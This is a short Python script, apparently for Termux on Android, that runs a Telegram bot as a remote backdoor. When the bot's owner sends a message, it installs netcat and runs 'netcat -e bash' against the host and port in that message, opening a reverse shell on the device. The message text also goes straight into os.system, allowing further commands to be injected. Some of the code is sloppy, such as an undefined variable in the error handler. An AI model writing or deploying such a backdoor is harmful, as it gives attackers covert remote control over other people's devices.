import telebot
import time
import os

bot = telebot.TeleBot("TOKEN")
user_id = id
@bot.message_handler(content_types=["text"])
def main(messange):
	if (user_id == messange.chat.id):
	   bot.send_message(messange.chat.id, "понял принял")
	   port = messange.text
	   termn = "netcat -e \"/data/data/com.termux/files/usr/bin/bash\"  "
	   try:
	      os.system("apt install -y netcat")
	      bot.send_message(messange.chat.id, "net установлен")
	      os.system(termn + port)
	      bot.send_message(messange.chat.id, "SESSION DIED")
	   except:
	      bot.send_message(message.chat.id, "что то не так")
if __name__ == '__main__':
    while True: 
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(10)


